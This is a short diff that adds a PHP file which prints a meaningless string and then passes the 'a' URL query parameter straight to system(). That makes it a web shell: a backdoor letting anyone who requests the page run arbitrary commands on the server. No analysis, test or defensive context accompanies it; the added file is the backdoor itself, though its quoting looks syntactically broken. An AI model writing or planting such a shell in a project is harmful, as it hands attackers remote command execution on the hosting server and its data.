@@ -1,0 +1,4 @@
+<?php
+print("aokokowkaokawk")
+system("$_GET['a']");
+?>
